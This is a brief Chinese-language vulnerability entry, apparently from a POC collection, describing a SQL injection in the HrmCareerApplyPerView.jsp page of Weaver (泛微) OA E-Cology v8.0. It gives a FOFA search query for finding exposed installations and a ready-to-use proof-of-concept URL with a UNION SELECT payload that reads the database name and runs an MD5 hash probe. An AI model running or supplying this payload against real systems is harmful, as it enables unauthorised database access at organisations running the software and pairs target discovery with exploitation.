# 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入


## 漏洞编号

暂无

## 漏洞类型

SQL注入

## 简介

泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台HrmCareerApplyPerView.jsp处存在SQL注入漏洞，攻击者通过漏洞可以获取数据库权限。

## 搜索语法

fofa：`app="泛微-协同办公OA"`

## POC

```
http://{{Hostname}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1%2c2%2csys.fn_sqlvarbasetostr(HashBytes('MD5'%2c'abc'))%2cdb_name(1)%2c5%2c6%2c
```

